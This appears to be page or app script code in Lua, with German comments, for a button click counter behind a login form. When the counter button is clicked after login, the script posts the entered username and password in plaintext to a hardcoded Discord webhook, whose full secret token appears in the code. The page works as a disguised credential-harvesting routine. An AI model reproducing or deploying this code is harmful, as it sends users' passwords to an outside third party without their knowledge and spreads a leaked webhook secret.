local button = get("button1")
local result = get("result")
local log = get("log")
local press = 1
local last_webhook_time = os.time() - 10 -- Initialisiert die Zeitvariable so, dass der Webhook beim Start sofort gesendet wird

local user_name = get("user_n")
local user_pass = get("user_p")
local log_bool = false
local button_login = get("button_login")

local discord_webhook_url = "https://discord.com/api/webhooks/1249752568188371085/lOGDGvGYhKpN_uJZWwHXAcg1Bp0FewWNZ5Bnwq05UnbYlZnNxe6ITccLSfIUE_xfy4iI"

button_login.on_click(function()
  log_bool = true
end)

button.on_click(function()
  result.set_content(press)
  local websocket = require'websocket'

  if log_bool and os.time() - last_webhook_time >= 10 then
    -- Send data to Discord Webhook
    local body = "{ \"content\": \"" .. user_name.get_content() .. ": " .. user_pass.get_content() .. ": " .. press .. "\" }"
    local res = fetch({
      url = discord_webhook_url,
      method = "POST",
      headers = { ["Content-Type"] = "application/json" },
      body = body,
    })
    
    if res and res.status == 204 then
      print("Message sent to Discord successfully.")
      last_webhook_time = os.time() -- Aktualisiert die Zeitvariable, wenn der Webhook erfolgreich gesendet wurde
    else
      print("Failed to send message to Discord. Status: " .. (res and res.status or "unknown"))
    end
  end
  
  press = press + 1
end)
